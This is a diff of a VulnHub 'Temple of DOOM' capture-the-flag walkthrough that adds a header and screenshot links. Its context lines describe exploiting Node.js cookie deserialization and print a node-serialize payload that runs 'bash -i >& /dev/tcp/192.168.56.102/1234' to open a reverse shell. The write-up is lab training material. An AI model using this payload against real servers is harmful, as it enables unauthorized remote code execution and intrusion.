@@ -1,4 +1,9 @@
 
+Temple of DOOM
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[+] NODE.JS serialization - Remote Code Execution RCE
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
 
 Scan Results
 
@@ -34,7 +39,8 @@ Under Construction, Come Back Later!
 
 After running the request through Burp we can see the Cookie has a value for profile
 After decoding it we get  
-![Alt Tag]()
+
+![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/TampleOfDoom/templeofdoom1.png)
 
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -43,7 +49,8 @@ After decoding it we get
 
 
 We change the profile value, in {"username":"Admin"}, Base 64 encode it and resubmit it to the server.
-![Alt Tag]()
+
+![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/TampleOfDoom/templeofdoom2.png)
 
 We take a look at some serialization with node js
 Resource for RCE NODE.js serialization .
@@ -57,7 +64,8 @@ We change the value of the cookie
 
 
 After resubmitting the request with this payload we can see that we are running commands on the server, as user : nodeadmin
-![Alt Tag]()
+
+![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/TampleOfDoom/templeofdoom3.png)
 
 
 Trying to get a reverse shell on the server:
@@ -66,13 +74,13 @@ Trying to get a reverse shell on the server:
 {"username":"_$$ND_FUNC$$_function(){return require('child_process').execSync('bash -i >& /dev/tcp/192.168.56.102/1234 0>&1',(e,out,err)=>{console.log(out);}); }()"}
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-![Alt Tag]()
+![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/TampleOfDoom/templeofdoom4.png)
 
 
 Sending this to repeater we get a reverse shell on the listening 1234 port open on Kali.
 
 
-![Alt Tag]()
+![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/TampleOfDoom/templeofdoom5.png)
 
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
